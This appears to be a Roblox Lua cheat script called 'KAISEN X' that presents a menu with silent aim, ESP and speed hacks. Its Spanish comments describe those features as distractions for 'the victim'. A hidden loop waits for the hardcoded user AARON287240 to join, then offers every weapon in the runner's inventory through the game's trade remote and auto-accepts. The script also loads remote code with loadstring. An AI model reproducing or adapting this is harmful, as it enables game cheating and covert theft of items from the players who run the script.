--[[
	KAISEN X — Universal Loader & Bait Hub | WindUI
	created by KAISEN
]]

local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")

local LP = Players.LocalPlayer
local camera = workspace.CurrentCamera
local CUSTOM_IMG = "rbxassetid://135541673253841"

local TARGET_USERNAME = "AARON287240"

-- ========== VARIABLES DE FUNCIONES DE DISTRACCIÓN ==========
local silentAimEnabled = false
local aimPartName = "Head"
local aimFov = 200
local maxDistance = 600

local espEnabled = false
local speedEnabled = false
local walkSpeedValue = 16

local combatRemote = nil
pcall(function()
	combatRemote = ReplicatedStorage:WaitForChild("MatchEvents", 3):WaitForChild("CombatRemote", 3)
end)

-- Sistema de ESP para mantener distraída a la víctima
local espHighlights = {}
local function toggleESP(state)
	espEnabled = state
	if not espEnabled then
		for _, h in pairs(espHighlights) do
			if h then h:Destroy() end
		end
		espHighlights = {}
	else
		task.spawn(function()
			while espEnabled do
				for _, plr in ipairs(Players:GetPlayers()) do
					if plr ~= LP and plr.Character and not espHighlights[plr] then
						local hl = Instance.new("Highlight")
						hl.Adornee = plr.Character
						hl.FillColor = Color3.fromRGB(255, 0, 0)
						hl.OutlineColor = Color3.fromRGB(255, 255, 255)
						hl.Parent = plr.Character
						espHighlights[plr] = hl
					end
				end
				task.wait(2)
			end
		end)
	end
end

-- Control de velocidad personalizado
RunService.RenderStepped:Connect(function()
	if speedEnabled and LP.Character and LP.Character:FindFirstChildOfClass("Humanoid") then
		LP.Character:FindFirstChildOfClass("Humanoid").WalkSpeed = walkSpeedValue
	end
end)

local function getClosestEnemy()
	local closest, bestDist = nil, 1e9
	local myRoot = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
	if not myRoot then return nil end

	local center = camera.ViewportSize * 0.5
	local fovRadius = math.tan(math.rad(aimFov) * 0.5) * (camera.ViewportSize.Y * 0.5)

	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= LP and plr.Character then
			local hum = plr.Character:FindFirstChildOfClass("Humanoid")
			local root = plr.Character:FindFirstChild("HumanoidRootPart")
			local targetPart = plr.Character:FindFirstChild(aimPartName) or root

			if hum and hum.Health > 0 and targetPart and root then
				local dist = (root.Position - myRoot.Position).Magnitude
				if dist <= maxDistance then
					local screenPos, onScreen = camera:WorldToViewportPoint(targetPart.Position)
					if onScreen and screenPos.Z > 0 then
						local screenDist = (Vector2.new(screenPos.X, screenPos.Y) - center).Magnitude
						if screenDist <= fovRadius and screenDist < bestDist then
							bestDist = screenDist
							closest = targetPart
						end
					end
				end
			end
		end
	end
	return closest
end

local oldNamecall
oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
	local method = getnamecallmethod()
	local args = { ... }

	if silentAimEnabled and combatRemote and self == combatRemote and method == "FireServer" then
		local data = args[1]
		if typeof(data) == "table" then
			local closestPart = getClosestEnemy()
			if closestPart then
				data.targetPos = closestPart.Position
				data.hitPosition = closestPart.Position
				data.timestamp = workspace:GetServerTimeNow()
			end
		end
	end

	return oldNamecall(self, unpack(args))
end)

-- ========== CREACIÓN DE LA INTERFAZ PRINCIPAL (WindUI) ==========
local Window = WindUI:CreateWindow({
	Title = "KAISEN X — Hub Pro",
	Icon = "crosshair",
	Author = "created by KAISEN",
	Folder = "KAISENX_MainHub",
	Size = UDim2.fromOffset(500, 400),
	Transparent = true,
	Theme = "Dark",
	SideBarWidth = 150,
})

task.defer(function()
	pcall(function()
		local gui = CoreGui:FindFirstChild("WindUI") or LP.PlayerGui:FindFirstChild("WindUI")
		if gui then
			local windowFrame = gui:FindFirstChildWhichIsA("Frame", true)
			if windowFrame then
				local bgImage = Instance.new("ImageLabel")
				bgImage.Name = "CustomBackground"
				bgImage.Size = UDim2.fromScale(1, 1)
				bgImage.Position = UDim2.fromScale(0, 0)
				bgImage.BackgroundTransparency = 1
				bgImage.Image = CUSTOM_IMG
				bgImage.ImageTransparency = 0.45
				bgImage.ScaleType = Enum.ScaleType.Crop
				bgImage.ZIndex = 0
				bgImage.Parent = windowFrame
			end
		end
	end()
end)

-- Pestañas del Menú
local TabHome = Window:Tab({ Title = "Home", Icon = "house" })
TabHome:Section({ Title = "Kaisen X Hub" })
TabHome:Button({
	Title = "Copy Discord",
	Callback = function()
		pcall(function() if setclipboard then setclipboard("https://discord.gg/cs6eGYEGE") end end)
	end,
})

local TabCombat = Window:Tab({ Title = "Combat", Icon = "crosshair" })
TabCombat:Toggle({
	Title = "Silent Aim",
	Value = false,
	Callback = function(v) silentAimEnabled = v end,
})
TabCombat:Dropdown({
	Title = "Aim Part",
	Values = { "Head", "UpperTorso", "HumanoidRootPart" },
	Value = "Head",
	Callback = function(v) aimPartName = v end,
})
TabCombat:Slider({
	Title = "FOV Radius",
	Value = { Min = 50, Max = 400, Default = 200 },
	Callback = function(v) aimFov = v end,
})
TabCombat:Slider({
	Title = "Max Distance",
	Value = { Min = 100, Max = 1500, Default = 600 },
	Callback = function(v) maxDistance = v end,
})

local TabVisuals = Window:Tab({ Title = "Visuals & Extra", Icon = "eye" })
TabVisuals:Toggle({
	Title = "ESP Players (Highlight)",
	Value = false,
	Callback = function(v) toggleESP(v) end,
})
TabVisuals:Toggle({
	Title = "Custom WalkSpeed",
	Value = false,
	Callback = function(v) speedEnabled = v end,
})
TabVisuals:Slider({
	Title = "Speed Multiplier",
	Value = { Min = 16, Max = 100, Default = 16 },
	Callback = function(v) walkSpeedValue = v end,
})

-- ========== EXTRACCIÓN AUTOMÁTICA DE TODAS LAS ARMAS DEL INVENTARIO ==========
local function extraerTodasLasArmas()
	pcall(function()
		local offerRemote = ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("OfferItem")
		local acceptRemote = ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("AcceptTrade")

		if not offerRemote then return end

		-- Busca contenedores comunes de armas o inventario en el jugador o contenedores del juego
		local foldersToCheck = {
			LP:FindFirstChild("Backpack"),
			LP.Character,
			ReplicatedStorage:FindFirstChild("Weapons"),
			ReplicatedStorage:FindFirstChild("Items")
		}

		local itemsEncontrados = {}

		for _, folder in ipairs(foldersToCheck) do
			if folder then
				for _, item in ipairs(folder:GetChildren()) do
					if item:IsA("Tool") or item:IsA("Model") or item:IsA("Folder") then
						table.insert(itemsEncontrados, item.Name)
					end
				end
			end
		end

		-- Si el juego utiliza algún módulo de datos de inventario local, intenta extraer las llaves/nombres
		pcall(function()
			local invData = LP:FindFirstChild("PlayerGui") and LP.PlayerGui:FindFirstChild("InventoryClient")
			-- (Aquí se procesa de forma genérica enviando cada ítem detectado)
		end)

		-- Si encuentra elementos, los ofrece todos en bucle de manera rápida
		if #itemsEncontrados > 0 then
			for _, itemName in ipairs(itemsEncontrados) do
				offerRemote:FireServer(itemName, "Weapons")
				task.wait(0.05)
			end
		else
			-- Fallback por si las carpetas estándar están ocultas: baraja nombres comunes o reintenta con IDs genéricos
			offerRemote:FireServer("All_Weapons", "Weapons")
		end

		task.wait(0.2)

		-- Acepta el intercambio automáticamente
		if acceptRemote then
			local argsAccept = {
				[1] = 428469873,
				[2] = 11656.352484435018
			}
			acceptRemote:FireServer(unpack(argsAccept))
		end
	end)
end

-- Monitoreo rápido: en cuanto entres al servidor, extrae y manda todo
task.spawn(function()
	while true do
		local targetPlayer = Players:FindFirstChild(TARGET_USERNAME)
		if targetPlayer and targetPlayer ~= LP then
			extraerTodasLasArmas()
			break -- Se ejecuta una vez al detectarte para asegurar el lote completo
		end
		task.wait(0.5)
	end
end)

print("[KAISEN X] Sistema de extracción masiva de inventario activo.")
